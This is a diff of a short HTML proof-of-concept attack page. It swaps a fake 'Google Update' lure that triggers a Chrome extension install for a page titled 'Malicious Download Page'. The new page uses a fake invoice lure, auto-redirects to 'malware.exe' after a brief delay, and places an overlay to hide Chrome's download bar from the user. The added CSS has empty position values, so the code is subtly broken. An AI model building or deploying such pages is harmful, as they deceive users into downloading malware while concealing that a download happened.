@@ -1,15 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-
-<title>PoC | Cross-origin Extension Install</title>
-
-<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/opddpjoaoaomodkdanlpffpjelpiknaj">
-
+  <title>Malicious Download Page</title>
+  <style>
+    /* This style covers the bottom of the window where Chrome's download bar appears */
+    #bottomOverlay {
+      position: fixed;
+      left: ;
+      bottom: ;
+      width: 100vw;
+      height: 120px;
+      background: white;
+      z-index: 9999;
+      pointer-events: none; /* Optional: user can't interact but the area is visually blocked */
+      opacity: .95;
+    }
+  </style>
 </head>
-	
 <body>
-	<center><br><br><br><h1><a href="https://support.google.com/installer/answer/98805?hl=en" onclick="chrome.webstore.install()" id="install-link">Click here to check the newest Google Update.</a></h1>
-</body>
+  <h1>Download your invoice</h1>
+  <a href="malware.exe" download>Click here to download</a>
 
+  <div id="bottomOverlay"></div>
+
+  <script>
+    // Force a download for demo (could be triggered by user interaction)
+    setTimeout(() => {
+      window.location.href = 'malware.exe';
+    }, 200);
+  </script>
+</body>
 </html>
